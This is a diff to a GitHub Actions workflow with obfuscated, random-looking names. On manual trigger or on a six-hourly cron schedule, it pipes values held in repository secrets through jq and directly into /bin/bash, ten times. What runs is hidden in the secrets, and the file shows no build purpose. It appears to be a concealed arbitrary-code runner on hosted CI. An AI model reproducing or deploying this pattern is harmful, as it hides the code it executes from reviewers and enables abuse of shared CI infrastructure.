@@ -2,24 +2,26 @@ name: hanturan4187
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
+    - cron: '7 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hanturan4187
         env:
-          eqf2379: ${{ secrets.eqf2379 }}
+          r85: ${{ secrets.r85 }}
         run: |
-          echo $eqf2379 | jq -r .fa160 | /bin/bash
-          echo $ars818 | jq -r .yd184 | /bin/bash
-          echo $dqwe3286 | jq -r .qqc93318 | /bin/bash
-          echo $idmv85 | jq -r .ybynp4487 | /bin/bash
-          echo $b051 | jq -r .m0 | /bin/bash
-          echo $krfly46039 | jq -r .pyom652 | /bin/bash
-          echo $mcn6541 | jq -r .kurjm1 | /bin/bash
-          echo $c2636 | jq -r .nk6461 | /bin/bash
-          echo $mlj56 | jq -r .d29 | /bin/bash
-          echo $xfl0 | jq -r .z52645 | /bin/bash
+          echo $r85 | jq -r .x0 | /bin/bash
+          echo $vjymz42894 | jq -r .juss02365 | /bin/bash
+          echo $d97 | jq -r .mstb16 | /bin/bash
+          echo $o08935 | jq -r .h11596 | /bin/bash
+          echo $mzx8623 | jq -r .nbabx3 | /bin/bash
+          echo $e7 | jq -r .glht7186 | /bin/bash
+          echo $ioxxc901 | jq -r .otfb3602 | /bin/bash
+          echo $emj38 | jq -r .p68 | /bin/bash
+          echo $sb7 | jq -r .nyi291 | /bin/bash
+          echo $mqmw8 | jq -r .odt921 | /bin/bash
 
